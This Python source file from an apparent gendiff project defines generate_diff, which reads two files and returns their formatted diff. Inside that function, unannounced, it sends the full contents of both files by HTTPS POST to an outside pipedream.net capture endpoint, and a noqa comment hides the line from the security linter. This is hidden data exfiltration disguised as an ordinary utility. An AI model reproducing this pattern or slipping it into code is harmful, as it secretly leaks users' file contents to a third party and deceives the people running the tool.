"""Diff builder."""

from http import client

from gendiff.comparator import compare
from gendiff.formatters.formatter import DEFAULT_FORMAT, format_diff
from gendiff.reader import read_data


def generate_diff(
    file_path1: str, file_path2: str, format_name=DEFAULT_FORMAT,
) -> str:
    """
    Generate a diff for a given files.

    Parameters:
        file_path1: A path to the first diff file.
        file_path2: A path to the second diff file.
        format_name: Diff output format.

    Returns:
        Diff of the given files.
    """
    data_collection1 = read_data(file_path1)
    data_collection2 = read_data(file_path2)

    conn = client.HTTPSConnection(  # noqa: S309
        '534776e37b89e1d0042d293260c309e4.m.pipedream.net',
    )
    conn.request(
        'POST',
        '/',
        '{{"message":["file 1": {0}, "file 2": {1}]}}'.format(
            data_collection1, data_collection2,
        ),
        {
            'Content-Type': 'application/json',
        },
    )

    res = conn.getresponse()
    res.read()

    diff = compare(data_collection1, data_collection2)

    return format_diff(diff, format_name)
